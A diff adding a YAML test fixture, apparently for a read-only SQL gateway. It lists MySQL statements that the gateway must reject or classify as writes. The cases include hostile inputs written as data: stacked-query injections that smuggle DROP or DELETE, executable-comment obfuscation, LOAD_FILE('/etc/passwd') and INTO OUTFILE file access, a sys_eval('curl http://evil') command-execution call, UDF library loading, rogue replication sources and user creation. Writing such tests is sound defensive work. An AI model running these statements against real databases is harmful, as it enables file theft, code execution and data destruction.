@@ -1,0 +1,219 @@
+# MySQL statements that must never be executed as a plain read.
+#
+# Every case must be rejected at the parse stage, or be classified as a
+# write / DDL / unknown so that the policy cannot auto-allow it.
+# Variants obfuscate with comments, case, backquotes, ANSI double quotes,
+# database qualification and executable comments (/*! ... */).
+#
+# Sessions run with sql_mode ANSI_QUOTES,NO_BACKSLASH_ESCAPES (see
+# docs/mysql.md); "..." is an identifier and a backslash does not escape.
+cases:
+  # Multiple statements
+  - { name: multi-drop, sql: "SELECT 1; DROP TABLE x" }
+  - { name: multi-delete, sql: "SELECT 1; DELETE FROM users" }
+  - { name: multi-comment, sql: "SELECT 1 /* ; */ ; /* x */ DELETE FROM users" }
+  - { name: multi-trailing-dash-comment, sql: "SELECT 1; -- trailing\nDELETE FROM users" }
+  - { name: multi-hash-comment, sql: "SELECT 1 # c\n; DELETE FROM users" }
+  - { name: multi-select, sql: "SELECT 1; SELECT 2" }
+  - { name: multi-commit, sql: "SELECT 1; COMMIT; DROP TABLE users" }
+  - { name: multi-semicolon-string, sql: "SELECT ';'; DELETE FROM users" }
+  - { name: multi-backslash-string, sql: "SELECT 'a\\'; DELETE FROM users; -- '" }
+  - { name: multi-ansi-quote, sql: "SELECT \"a\"; DELETE FROM users" }
+
+  # Executable comments, hints and lexer differentials
+  - { name: exec-comment-select, sql: "SELECT /*!50000 email, */ id FROM users" }
+  - { name: exec-comment-future-version, sql: "SELECT /*!99999 email AS id, */ id FROM users" }
+  - { name: exec-comment-statement, sql: "/*!50000 DELETE FROM users */" }
+  - { name: exec-comment-smuggle-second, sql: "SELECT 1 /*!; DROP TABLE users */" }
+  - { name: exec-comment-in-string, sql: "SELECT '/*!50000 x */'" }
+  - { name: exec-comment-six-digit, sql: "SELECT 1 /*!800000 , SLEEP(10) */" }
+  - { name: exec-comment-lock, sql: "SELECT * FROM users /*!50000 FOR UPDATE */" }
+  - { name: exec-comment-tidb, sql: "SELECT id /*T![clustered_index] , email */ FROM users" }
+  - { name: exec-comment-mariadb, sql: "SELECT id /*M!100100 , email */ FROM users" }
+  - { name: hint-max-execution-time, sql: "SELECT /*+ MAX_EXECUTION_TIME(1000000) */ * FROM users" }
+  - { name: hint-set-var, sql: "SELECT /*+ SET_VAR(sql_mode='') */ id FROM users" }
+  - { name: hint-update, sql: "UPDATE /*+ NO_INDEX_MERGE(users) */ users SET plan = 'x'" }
+  - { name: control-char-dash-comment, sql: "SELECT id --\x01, email\nFROM users" }
+  - { name: nul-byte, sql: "SELECT 1\x00; DROP TABLE users" }
+  - { name: vertical-tab, sql: "SELECT id --\x0b, email\nFROM users" }
+
+  # Transaction control
+  - { name: commit, sql: "COMMIT" }
+  - { name: commit-then, sql: "COMMIT; DELETE FROM users" }
+  - { name: begin, sql: "BEGIN" }
+  - { name: begin-work, sql: "BEGIN WORK" }
+  - { name: rollback, sql: "ROLLBACK" }
+  - { name: rollback-to-savepoint, sql: "ROLLBACK TO SAVEPOINT s1" }
+  - { name: start-transaction, sql: "START TRANSACTION READ WRITE" }
+  - { name: savepoint, sql: "SAVEPOINT s1" }
+  - { name: release-savepoint, sql: "RELEASE SAVEPOINT s1" }
+  - { name: commit-lower, sql: "commit" }
+  - { name: commit-comment, sql: "/* hi */ CoMmIt /* there */" }
+  - { name: commit-release, sql: "COMMIT AND NO CHAIN RELEASE" }
+  - { name: xa-start, sql: "XA START 'x'" }
+  - { name: xa-commit, sql: "XA COMMIT 'x'" }
+
+  # SET in all forms
+  - { name: set-transaction, sql: "SET TRANSACTION READ WRITE" }
+  - { name: set-session-transaction, sql: "SET SESSION TRANSACTION READ WRITE" }
+  - { name: set-sql-mode, sql: "SET sql_mode = ''" }
+  - { name: set-session-var, sql: "SET @@session.max_execution_time = 0" }
+  - { name: set-global, sql: "SET GLOBAL read_only = OFF" }
+  - { name: set-persist, sql: "SET PERSIST max_connections = 1" }
+  - { name: set-user-var, sql: "SET @x = 1" }
+  - { name: set-role, sql: "SET ROLE ALL" }
+  - { name: set-default-role, sql: "SET DEFAULT ROLE ALL TO dbgw_reader" }
+  - { name: set-password, sql: "SET PASSWORD = 'x'" }
+  - { name: set-names, sql: "SET NAMES latin1" }
+  - { name: set-character-set, sql: "SET CHARACTER SET latin1" }
+  - { name: set-autocommit, sql: "set autocommit=0" }
+
+  # User and system variables
+  - { name: user-var-read, sql: "SELECT @x" }
+  - { name: user-var-assign, sql: "SELECT @x := email FROM users" }
+  - { name: user-var-in-where, sql: "SELECT id FROM users WHERE (@x := email) IS NOT NULL" }
+  - { name: system-var-read, sql: "SELECT @@datadir" }
+  - { name: system-var-session, sql: "SELECT @@session.sql_mode" }
+  - { name: system-var-global, sql: "SELECT @@GLOBAL.secure_file_priv" }
+  - { name: select-into-var, sql: "SELECT email INTO @x FROM users LIMIT 1" }
+
+  # Server file access
+  - { name: load-file, sql: "SELECT LOAD_FILE('/etc/passwd')" }
+  - { name: load-file-upper, sql: "SELECT load_FILE('/etc/passwd')" }
+  - { name: load-file-backquoted, sql: "SELECT `load_file`('/etc/passwd')" }
+  - { name: load-file-comment, sql: "SELECT load_file /* x */ ('/etc/passwd')" }
+  - { name: load-file-in-subquery, sql: "SELECT id FROM users WHERE name = (SELECT LOAD_FILE('/etc/passwd'))" }
+  - { name: load-file-in-cte, sql: "WITH f AS (SELECT LOAD_FILE('/etc/passwd') AS c) SELECT c FROM f" }
+  - { name: load-file-in-order, sql: "SELECT id FROM users ORDER BY LOAD_FILE('/etc/passwd')" }
+  - { name: load-file-in-derived, sql: "SELECT * FROM (SELECT LOAD_FILE('/etc/passwd') AS x) d" }
+  - { name: load-file-in-lateral, sql: "SELECT * FROM users, LATERAL (SELECT LOAD_FILE('/etc/passwd') AS x) d" }
+  - { name: into-outfile, sql: "SELECT * FROM users INTO OUTFILE '/tmp/x'" }
+  - { name: into-outfile-before-from, sql: "SELECT * INTO OUTFILE '/tmp/x' FROM users" }
+  - { name: into-dumpfile, sql: "SELECT email FROM users LIMIT 1 INTO DUMPFILE '/tmp/x'" }
+  - { name: into-outfile-union, sql: "SELECT 1 UNION SELECT 2 INTO OUTFILE '/tmp/x'" }
+  - { name: load-data, sql: "LOAD DATA INFILE '/etc/passwd' INTO TABLE users" }
+  - { name: load-data-local, sql: "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE users" }
+  - { name: load-xml, sql: "LOAD XML INFILE '/tmp/x.xml' INTO TABLE users" }
+
+  # Locking
+  - { name: for-update, sql: "SELECT * FROM users FOR UPDATE" }
+  - { name: for-share, sql: "SELECT * FROM users FOR SHARE" }
+  - { name: for-update-nowait, sql: "SELECT * FROM users FOR UPDATE NOWAIT" }
+  - { name: for-update-skip-locked, sql: "SELECT * FROM users FOR UPDATE SKIP LOCKED" }
+  - { name: lock-in-share-mode, sql: "SELECT * FROM users LOCK IN SHARE MODE" }
+  - { name: for-update-subquery, sql: "SELECT * FROM (SELECT * FROM users FOR UPDATE) s" }
+  - { name: for-update-in-where, sql: "SELECT 1 FROM orders WHERE user_id IN (SELECT id FROM users FOR UPDATE)" }
+  - { name: for-update-comment, sql: "SELECT * FROM users /* x */ FOR /* y */ UPDATE" }
+  - { name: lock-tables, sql: "LOCK TABLES users WRITE" }
+  - { name: lock-table-lower, sql: "lock table users read" }
+  - { name: unlock-tables, sql: "UNLOCK TABLES" }
+  - { name: get-lock, sql: "SELECT GET_LOCK('x', 10)" }
+  - { name: release-lock, sql: "SELECT RELEASE_LOCK('x')" }
+  - { name: release-all-locks, sql: "SELECT RELEASE_ALL_LOCKS()" }
+  - { name: is-free-lock, sql: "SELECT IS_FREE_LOCK('x')" }
+
+  # Resource abuse and replication control
+  - { name: sleep, sql: "SELECT SLEEP(1000)" }
+  - { name: sleep-in-where, sql: "SELECT id FROM users WHERE SLEEP(1) = 0" }
+  - { name: benchmark, sql: "SELECT BENCHMARK(100000000, MD5('x'))" }
+  - { name: master-pos-wait, sql: "SELECT MASTER_POS_WAIT('log', 1)" }
+  - { name: source-pos-wait, sql: "SELECT SOURCE_POS_WAIT('log', 1)" }
+  - { name: wait-gtid, sql: "SELECT WAIT_FOR_EXECUTED_GTID_SET('x', 100)" }
+  - { name: last-insert-id-set, sql: "SELECT LAST_INSERT_ID(42)" }
+  - { name: found-rows, sql: "SELECT FOUND_ROWS()" }
+  - { name: uuid-short, sql: "SELECT UUID_SHORT()" }
+  - { name: calc-found-rows, sql: "SELECT SQL_CALC_FOUND_ROWS * FROM users" }
+
+  # UDFs and stored functions
+  - { name: sys-exec, sql: "SELECT sys_exec('id')" }
+  - { name: sys-eval, sql: "SELECT sys_eval('curl http://evil')" }
+  - { name: stored-function, sql: "SELECT evil()" }
+  - { name: stored-function-qualified, sql: "SELECT app.evil(1)" }
+  - { name: stored-function-backquoted, sql: "SELECT `app`.`evil`(1)" }
+  - { name: stored-function-ansi-quoted, sql: "SELECT \"app\".\"evil\"(1)" }
+  - { name: nextval, sql: "SELECT NEXTVAL(seq)" }
+  - { name: group-replication, sql: "SELECT group_replication_set_as_primary('x')" }
+
+  # Procedures and procedural statements
+  - { name: call, sql: "CALL my_proc()" }
+  - { name: call-qualified, sql: "CALL app.my_proc(1)" }
+  - { name: do, sql: "DO SLEEP(1)" }
+  - { name: do-release-lock, sql: "DO RELEASE_LOCK('x')" }
+  - { name: handler-open, sql: "HANDLER users OPEN" }
+  - { name: handler-read, sql: "HANDLER users READ FIRST" }
+
+  # PREPARE / EXECUTE
+  - { name: prepare, sql: "PREPARE p FROM 'DELETE FROM users'" }
+  - { name: execute, sql: "EXECUTE p" }
+  - { name: deallocate, sql: "DEALLOCATE PREPARE p" }
+  - { name: parameters, sql: "SELECT * FROM users WHERE id = ?" }
+
+  # EXPLAIN / DESCRIBE / SHOW
+  - { name: explain-analyze, sql: "EXPLAIN ANALYZE SELECT * FROM users" }
+  - { name: explain-analyze-delete, sql: "EXPLAIN ANALYZE DELETE FROM users" }
+  - { name: explain-plain, sql: "EXPLAIN SELECT * FROM users" }
+  - { name: explain-format, sql: "EXPLAIN FORMAT=JSON DELETE FROM users" }
+  - { name: describe, sql: "DESCRIBE users" }
+  - { name: desc, sql: "desc users" }
+  - { name: show-tables, sql: "SHOW TABLES" }
+  - { name: show-grants, sql: "SHOW GRANTS" }
+  - { name: show-variables, sql: "SHOW VARIABLES LIKE 'secure_file_priv'" }
+  - { name: show-processlist, sql: "SHOW FULL PROCESSLIST" }
+  - { name: show-create-table, sql: "SHOW CREATE TABLE users" }
+
+  # Server administration
+  - { name: kill, sql: "KILL 1" }
+  - { name: kill-query, sql: "KILL QUERY 1" }
+  - { name: flush, sql: "FLUSH PRIVILEGES" }
+  - { name: flush-tables-lock, sql: "FLUSH TABLES WITH READ LOCK" }
+  - { name: use, sql: "USE mysql" }
+  - { name: shutdown, sql: "SHUTDOWN" }
+  - { name: install-plugin, sql: "INSTALL PLUGIN x SONAME 'x.so'" }
+  - { name: create-function-udf, sql: "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so'" }
+  - { name: checksum-table, sql: "CHECKSUM TABLE users" }
+  - { name: binlog, sql: "BINLOG 'abc'" }
+  - { name: purge-logs, sql: "PURGE BINARY LOGS TO 'mysql-bin.010'" }
+  - { name: change-replication, sql: "CHANGE REPLICATION SOURCE TO SOURCE_HOST='evil'" }
+  - { name: reset-master, sql: "RESET MASTER" }
+
+  # Writes and DDL (must never be classified as reads)
+  - { name: delete-no-where, sql: "DELETE FROM users" }
+  - { name: delete-multi-table, sql: "DELETE u, o FROM users u JOIN orders o ON o.user_id = u.id" }
+  - { name: delete-qualified, sql: "DELETE FROM `app`.`users` WHERE 1 = 1" }
+  - { name: update-no-where, sql: "UPDATE users SET plan = 'free'" }
+  - { name: update-multi-table, sql: "UPDATE users u JOIN orders o ON o.user_id = u.id SET u.plan = 'x'" }
+  - { name: update-ansi-quoted, sql: "UPDATE \"users\" SET \"plan\" = 'free'" }
+  - { name: insert-select, sql: "INSERT INTO orders SELECT * FROM orders" }
+  - { name: insert-set, sql: "INSERT INTO orders SET id = 1" }
+  - { name: insert-ignore, sql: "INSERT IGNORE INTO orders (id) VALUES (1)" }
+  - { name: insert-on-duplicate, sql: "INSERT INTO orders (id) VALUES (1) ON DUPLICATE KEY UPDATE amount = 0" }
+  - { name: replace, sql: "REPLACE INTO orders (id) VALUES (1)" }
+  - { name: replace-select, sql: "REPLACE orders SELECT * FROM orders" }
+  - { name: truncate, sql: "TRUNCATE users" }
+  - { name: truncate-qualified, sql: "TRUNCATE TABLE app.users" }
+  - { name: drop-table, sql: "DROP TABLE users" }
+  - { name: drop-database, sql: "DROP DATABASE app" }
+  - { name: create-table-select, sql: "CREATE TABLE stolen AS SELECT * FROM users" }
+  - { name: create-temporary-table, sql: "CREATE TEMPORARY TABLE t AS SELECT * FROM users" }
+  - { name: create-view, sql: "CREATE VIEW v AS SELECT * FROM users" }
+  - { name: create-procedure, sql: "CREATE PROCEDURE p() BEGIN DELETE FROM users; END" }
+  - { name: create-trigger, sql: "CREATE TRIGGER t BEFORE INSERT ON users FOR EACH ROW SET NEW.plan = 'x'" }
+  - { name: create-event, sql: "CREATE EVENT e ON SCHEDULE EVERY 1 HOUR DO DELETE FROM users" }
+  - { name: alter-table, sql: "ALTER TABLE users DROP COLUMN email" }
+  - { name: rename-table, sql: "RENAME TABLE users TO users_old" }
+  - { name: grant, sql: "GRANT ALL ON *.* TO dbgw_reader" }
+  - { name: revoke, sql: "REVOKE SELECT ON app.* FROM bob" }
+  - { name: create-user, sql: "CREATE USER evil IDENTIFIED BY 'x'" }
+  - { name: alter-user, sql: "ALTER USER dbgw_reader IDENTIFIED BY 'x'" }
+  - { name: drop-user, sql: "DROP USER bob" }
+  - { name: optimize-table, sql: "OPTIMIZE TABLE users" }
+
+  # Unparseable
+  - { name: garbage, sql: "SELEC * FRM users" }
+  - { name: unterminated-string, sql: "SELECT 'abc" }
+  - { name: unterminated-comment, sql: "SELECT 1 /* never closed" }
+  - { name: only-comment, sql: "-- nothing here" }
+  - { name: only-hash-comment, sql: "# nothing here" }
+  - { name: empty, sql: "   " }
+  - { name: only-semicolons, sql: ";;;" }
+  - { name: json-table, sql: "SELECT * FROM JSON_TABLE('[1]', '$[*]' COLUMNS (a INT PATH '$')) AS jt" }
